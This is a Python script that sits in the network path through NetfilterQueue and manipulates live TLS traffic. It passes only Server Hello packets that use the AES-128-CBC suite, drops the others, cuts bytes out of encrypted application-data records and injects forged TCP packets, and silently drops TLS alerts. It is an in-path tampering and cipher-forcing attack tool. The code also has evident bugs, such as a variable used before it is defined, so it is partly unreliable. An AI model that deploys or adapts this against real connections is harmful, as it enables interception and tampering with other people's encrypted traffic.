from scapy.all import *
import scapy.all as scapy
from netfilterqueue import NetfilterQueue
from scapy.layers.inet import IP
from scapy.layers.tls.record import TLS, TLSApplicationData, TLSAlert
#from scapy_ssl_tls.ssl_tls import TLS, TLSClientHello, TLSServerHello  # Import TLS layers
import pyshark
import io
import tempfile
import os

load_layer ('tls')

# Define the callback function to process each packet
def process_packet(pkt):
    # Convert the packet to a Scapy packet
    scapy_pkt = IP(pkt.get_payload())
    #print(scapy_pkt)
#    pcap_packet = io.BytesIO(scapy_pkt)
 #   packet_bytes = pcap_packet.getvalue()

    with tempfile.NamedTemporaryFile(delete=False, suffix='.pcap') as pcap_file:
        # Create a temporary file to hold the packet in PCAP format
        pcap_file_name = pcap_file.name
        
        # Write the packet to the file
        scapy.wrpcap(pcap_file_name, [scapy_pkt])

        print("Saving packet to {0}".format(pcap_file_name))

    packetstatus = False

    cap = pyshark.FileCapture(pcap_file_name)

    for packet in cap:
        if 'TLS' in packet:
            print("Packet number: {0}".format(packet.number))
            print("Timestamp: {0}".format(packet.sniff_time))
            print("Source IP: {0}".format(packet.ip.src))
            print("Destination IP: {0}".format(packet.ip.dst))
            print("Protocol: {0}".format(packet.transport_layer))

            if packet.tls.record_content_type == "22":
                print("HandShake Packet")
                print("TLS Handshake Type {0}".format(packet.tls.handshake))
                print("TLS cipher suite {0}".format(tls_data.get('tls.handshake.ciphersuites')))
                if "Server Hello" in packet.tls.handshake:
                    if "0x002f" in str(packet):
                        print("Server hello is using AES 128 CBC for it's CIPHER allowing this handshake")
                        pkt.accept()
                        packetstatus = True
                    else:
                        print("Incorrect Server hello cipher and version DROPPING this PACKET")
                        pkt.drop()
                    packetstatus = True
        print("-" * 50)

    # You can also inspect deeper details of the packet layers if needed:
        if 'TLS' in packet:

            if packet.tls.record_content_type == "23":
                tls_data = packet.tls._all_fields
                #print(tls_data)

                print(packet.tls.app_data)
                IP_scapy_pkt = TLS(pkt.get_payload())
                print("Packet Summary")
                print(IP_scapy_pkt.mysummary())
                print("-----")

                TLSdataClass = TLSApplicationData(pkt.get_payload())
                print("TLSdata class")

                print(TLSdataClass.show())
                print(TLSdataClass.data)
                print("-----")
                packetS = IP(pkt.get_payload())

                payload = IP_scapy_pkt[Raw].load
                print("Payload")
                print(payload.hex())
                payloadArray = bytearray(payload)
                #payloadArray[-1] = 0x00
                payload = bytes(payloadArray[52:])
                print(payload.hex())
                print(IP_scapy_pkt.show())
                IP_scapy_pkt[Raw].load = payload
                print("-" * 50)
 #               print(IP_scapy_pkt[TLS].type)
    #TLS_scapy_pkt = TLS(pkt.get_payload())
                print(IP_scapy_pkt.show())
                new_packet = IP(dst=packetS[IP].dst, src=packetS[IP].src) / \
                             TCP(dport=packetS[TCP].dport,sport=packetS[TCP].sport, flags="A", seq=packetS[TCP].seq, ack=packetS[TCP].ack) / \
                             payload
                new_packet = new_packet.__class__(bytes(new_packet))



                
                send(new_packet)
                print("sent modifid packet")
                print(new_packet.show())
                print(packetS.show())
#                pkt.drop()
                packetstatus = True
            print(packet.tls.record_content_type)



    IP_scapy_pkt = IP(pkt.get_payload())
    if IP_scapy_pkt.haslayer(Raw):
    
        if 0x15 == bytearray(IP_scapy_pkt[Raw].load)[0]:
            TLSdataClass = TLSAlert(pkt.get_payload())
            print("TLSAlert class")

            print(TLSdataClass.show())


            packet = IP(pkt.get_payload())
            pkt.drop()
            print("This is the error alert PACKET. We want to look for this Packet for when get error response back from the server")
            packetstatus = True 

    # Check if the packet has an IP layer
    if IP_scapy_pkt.haslayer(IP):
        ip_src = IP_scapy_pkt[IP].src
        ip_dst = IP_scapy_pkt[IP].dst
        print("Inspecting packet from {0} to {1}".format(ip_src, ip_dst))
    if not packetstatus:
        pkt.accept()

    cap.close()
# Set up NetfilterQueue and bind to queue number 0
nfqueue = NetfilterQueue()
nfqueue.bind(0, process_packet)

try:
    print("Starting NFQUEUE capture... Press Ctrl+C to stop.")
    nfqueue.run()  # Start capturing and processing packets
except KeyboardInterrupt:
    print("Exiting... Stopping NFQUEUE.")
    nfqueue.unbind()
